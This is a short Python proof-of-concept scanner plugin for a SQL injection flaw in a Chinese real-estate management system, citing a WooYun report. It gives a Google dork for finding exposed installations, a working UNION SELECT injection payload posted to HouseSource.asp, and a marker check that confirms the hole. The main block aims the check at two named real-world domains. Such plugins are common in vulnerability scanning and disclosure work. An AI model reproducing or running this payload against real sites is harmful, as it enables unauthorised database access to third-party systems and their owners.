#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 弘智科技房产管理系统SQL注入
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2014-075924
description:
    pubinfo/Moreysxk.asp?Qryqyxmbm=DBDHDADCDADADADJDDDBDCDF000002
google dork: 
    inurl:pubinfo/Moreysxk.asp?Qryqyxmbm
'''

def assign(service, arg):
    if service == 'hongzhi':
        return True, arg

def audit(arg):
    url = arg + 'pubinfo/HouseSource.asp?forsearch=1'
    post = 'xm_xzqy=&xm_xmmc=test%27union%20select%20NULL,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99),NULL,NULL,NULL,NULL--&xm_xmdz=&xm_kfs=&xm_fwhx=&xmcx.x=43&xmcx.y=13'
    code, head, res, err, _ = curl.curl2(url, post=post)
    if (code == 200) and ('WtFaBc' in res):
        security_hole('SQL Injection: ' + url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('hongzhi', 'http://www.yafcj.com/')[1])
    audit(assign('hongzhi', 'http://www.yxxfgj.com/')[1])